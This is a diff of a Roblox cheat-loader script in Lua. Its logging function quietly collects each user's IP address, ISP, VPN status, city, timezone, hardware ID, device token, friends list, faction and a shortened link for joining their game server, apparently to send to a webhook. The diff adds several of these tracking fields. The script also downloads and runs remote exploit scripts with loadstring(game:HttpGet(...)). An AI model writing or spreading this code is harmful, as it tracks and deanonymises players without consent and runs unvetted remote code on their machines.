@@ -1,20 +1,19 @@
 local _lp = game:GetService("Players").LocalPlayer
 local _ts = game:GetService("TestService")
 
--- Двойная проверка рукопожатия
 local _storage = _ts:FindFirstChild("__NK_RUNTIME")
 local _phys_auth = _storage and _storage:FindFirstChild(_lp.Name)
 if not (shared._NK_LOADER_AUTH == "V8_SECURE_TOKEN_VALID" or (_phys_auth and _phys_auth.Value == "V8_SECURE_TOKEN_VALID")) then
-    _lp:Kick("Direct execution prohibited. Run through the loader.")
+    _lp:Kick("Execution prohibited. Use official loader.")
     return
 end
-shared._NK_LOADER_AUTH = nil -- Очистка
+shared._NK_LOADER_AUTH = nil
 
 local Config = {
     WL = {
         UIDs = {"10760143653"},
         HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
-        Keys = {"89D11F50-5490-4677-B709-4EBFBECA78CE", "46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
+        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
     },
     BL = { UIDs = {}, HWIDs = {}, Keys = {} }
 }
@@ -49,9 +48,32 @@ local function _LOG()
         local req = (syn and syn.request or request or http_request)
         local r = req({Url = _IP_URL, Method = "GET"})
         local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
+        
         local u = 0
-        for _, f in ipairs({"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}) do if getgenv()[f] then u = u + 1 end end
-        local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (" .. math.floor((u/4)*100) .. "%)"
+        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
+        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
+        local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/4)*100) .. "%)"
+        
+        local fn, ft = "None", "None"
+        local fdf = game:GetService("ReplicatedStorage"):FindFirstChild("FactionSysRS") and game:GetService("ReplicatedStorage").FactionSysRS:FindFirstChild("FactionData")
+        if fdf then
+            for _, f in ipairs(fdf:GetChildren()) do
+                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
+                    local bd = f:FindFirstChild("BasicFactionData")
+                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
+                    break
+                end
+            end
+        end
+
+        local jid = game.JobId == "" and "Unknown" or game.JobId
+        local joinBase = "roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid
+        local joinUrl = "Join Link Error"
+        pcall(function()
+            local res = req({Url = "https://tinyurl.com/api-create.php?url="..joinBase, Method = "GET"})
+            if res and res.Success then joinUrl = "[Click to Join Server]("..res.Body..")" end
+        end)
+
         local friends = {}
         for _, p in ipairs(game.Players:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
 
@@ -60,14 +82,18 @@ local function _LOG()
                 ["title"] = (_st == "whitelist" and "✅ Whitelisted User Executed" or "👤 Unknown/Guest User Executed"),
                 ["color"] = (_st == "whitelist" and 65280 or 16753920),
                 ["fields"] = {
-                    {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Age:** %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
+                    {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", _lp.DisplayName, _lp.Name, _uid, tostring(_lp.AccountAge)), ["inline"] = false},
                     {["name"] = "Executor", ["value"] = unc, ["inline"] = true},
+                    {["name"] = "System", ["value"] = "**Platform:** " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
+                    {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = false},
                     {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                     {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
-                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false}
+                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN/Proxy:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
+                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
+                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
+                    {["name"] = "Links", ["value"] = joinUrl .. " | [Profile](https://www.roblox.com/users/".._uid.."/profile)", ["inline"] = false}
                 },
-                ["footer"] = {["text"] = "Logger | " .. string.upper(_st)},
+                ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%X")},
                 ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
         }
@@ -77,7 +103,7 @@ end
 
 task.spawn(_LOG)
 
--- KILLSWITCH & DRAGGABLE GUI
+-- KILLSWITCH & GUI
 if _st == "whitelist" then
     local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
     local f = Instance.new("Frame", sg)
@@ -100,7 +126,7 @@ end
 
 _phys_auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end)
 
--- Запуск твоих ссылок
+-- ТВОИ СКРИПТЫ
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))() end)
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))() end)
 pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
